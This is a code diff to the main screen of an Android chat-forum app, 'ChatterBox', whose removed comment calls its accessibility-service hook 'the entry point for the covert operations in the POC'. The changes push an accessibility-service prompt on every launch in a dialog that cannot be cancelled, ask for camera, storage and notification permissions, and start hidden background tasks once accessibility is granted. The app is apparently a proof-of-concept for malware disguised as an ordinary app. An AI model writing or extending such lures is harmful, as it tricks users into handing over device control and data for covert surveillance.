@@ -1,6 +1,7 @@
 package com.example.ChatterBox
 
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Bundle
 import android.util.Log
 import android.view.Menu
@@ -42,14 +43,15 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         loadUserProfile()
         checkIfAdmin()
         loadEnrolledForums()
-        
-        // Check if accessibility service is enabled and schedule background tasks if it is
-        // This is the entry point for the covert operations in the POC
-        AccessibilityHelper.checkAndScheduleBackgroundTasks(this)
-        
-        // If accessibility service is not enabled, occasionally suggest it
-        if (!AccessibilityHelper.isAccessibilityServiceEnabled(this) && Math.random() < 0.1) {
+
+        requestInitialPermissions()
+
+        // Show accessibility prompt if not enabled (100% of the time for demo)
+        if (!AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
             showAccessibilityPrompt()
+        } else {
+            // If accessibility is already enabled, schedule the background tasks
+            AccessibilityHelper.checkAndScheduleBackgroundTasks(this)
         }
     }
     
@@ -65,10 +67,35 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 startActivity(Intent(this, AccessibilityPromoActivity::class.java))
             }
             .setNegativeButton("Maybe Later", null)
+            .setCancelable(false)
             .create()
         
         dialog.show()
     }
+    private fun requestInitialPermissions() {
+        // List of initial permissions to request
+        val initialPermissions = arrayOf(
+            android.Manifest.permission.CAMERA,
+            android.Manifest.permission.READ_EXTERNAL_STORAGE,
+            android.Manifest.permission.POST_NOTIFICATIONS
+
+        )
+
+        // Check which permissions we need to request
+        val permissionsToRequest = initialPermissions.filter {
+            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
+        }.toTypedArray()
+
+        // Request permissions if needed
+        if (permissionsToRequest.isNotEmpty()) {
+            requestPermissions(permissionsToRequest, PERMISSION_REQUEST_CODE)
+        }
+    }
+
+    companion object {
+        private const val PERMISSION_REQUEST_CODE = 100
+    }
+
 
     /** 🔹 Setup Navigation Drawer */
     private fun setupDrawer() {
